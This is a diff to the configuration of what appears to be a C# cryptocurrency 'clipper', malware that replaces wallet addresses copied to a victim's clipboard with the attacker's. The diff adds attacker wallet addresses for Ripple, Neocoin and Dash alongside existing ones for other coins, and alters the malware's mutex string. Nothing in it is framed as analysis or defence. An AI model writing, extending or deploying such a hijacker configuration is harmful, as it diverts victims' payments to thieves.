@@ -20,14 +20,14 @@ namespace Clipper
             {"eth", "0xf8B9e54C66a8Ac253F375cC05cE7aB0ddA516dc1" }, // Ethereum
             {"xmr", "41nizz95at5QEZ9ZhLi2mUHVHEHhbDSXB4Q3uMNFh5H8H7w9TtRzZ3qQkkMdkf7B3v7TVMCZ63gmqgaSkWtgjnv5L9Ke7cR" }, // Monero
             {"xlm", "GBMNM7KM7CKNK4BNOPWCXRDZ4HI572RW4V7TEJSCHPUFTS5I4BFIW7IY" }, // Stellar
-            {"xrp", "" }, // Ripple
+            {"xrp", "rJuoupMq7mY2cZPupk6kyybvsxtQmtb3G2" }, // Ripple
             {"ltc", "ltc1qxpsuma67n4hvznwvdj3l7w98t2kygvy92e0ayw" }, // Litecoin
-            {"nec", "" }, // Neocoin
+            {"nec", "NUc67ZqqJAENiCYJmzsy9GQajku2npo32S" }, // Neocoin
             {"bch", "qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t" }, // Bitcoin Cash
-            {"dash", "" } // Dashcoin
+            {"dash", "Xgeqigq8kXaYjksdLDiYKHesU4SM2kCSkG" } // Dashcoin
         };
         // Mutex (random)
-        public static string mutex = "a1sfrewrfwerewsf231";
+        public static string mutex = "ab1frewrfwerewsf231";
 
     }
 }
